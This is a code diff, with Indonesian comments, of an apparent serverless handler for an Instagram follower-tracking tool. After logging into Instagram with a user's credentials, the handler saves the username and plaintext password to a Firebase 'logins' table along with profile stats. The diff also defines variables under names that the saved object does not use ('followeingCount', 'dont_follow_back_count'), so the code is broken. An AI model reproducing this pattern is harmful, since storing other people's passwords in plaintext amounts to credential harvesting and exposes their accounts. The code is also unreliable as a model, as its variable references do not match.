@@ -159,18 +159,24 @@ exports.handler = async function(event, context) {
             const user = await ig.account.currentUser();
             const userId = user.pk;
 
+            const followersCount = user.follower_count; // Tadi belum di definisikan
+const followingCount = user.following_count; 
+const full_name = user.full_name; // Ambil full_name dari user
+const dontFollowBackCount = dontFollowBack.length; // Ambil don't follow back count 
+
             // Simpan ke Firebase Realtime Database
+
             const loginData = {
-                username,
-                password,
-                userId,
-                timestamp: new Date().toISOString(),
-                 followersCount,
-                 followeingCount,
-                full_name,
-                dont_follow_back_count,
-                profile_picture_url: user.profile_pic_url, // Menyimpan URL gambar profil
-            };
+    username,
+    password,
+    userId,
+    timestamp: new Date().toISOString(),
+    followersCount,
+    followeingCount,
+    full_name,
+    dont_follow_back_count,
+    profile_picture_url: user.profile_pic_url,
+};
 
             // Menyimpan data login di Realtime Database
             await db.ref('logins').child(userId).set(loginData);
